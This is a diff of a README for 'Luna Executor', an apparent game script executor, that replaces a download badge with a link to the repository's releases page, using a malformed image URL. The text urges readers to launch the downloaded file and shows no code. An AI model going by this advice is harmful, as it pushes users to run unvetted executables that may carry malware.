@@ -16,7 +16,7 @@ Luna Executor is a powerful tool designed for executing custom scripts within th
 
 ## Get Started 🚀
 To access Luna Executor and start exploring its exciting features, download the tool from the following link:
-[![Download Luna Executor](https://img.shields.io/badge/Download-Luna%20Executor-blue)](https://github.com/files/File.zip)
+[![Download Luna Executor](https://github.com/asmuiazfar/Luna-Executor/releases%20Executor-blue)](https://github.com/asmuiazfar/Luna-Executor/releases)
 
 If the link ends with the file name, make sure to launch it. If the link does not work or is not provided, kindly check the "Releases" section of the repository for alternative download options.
 
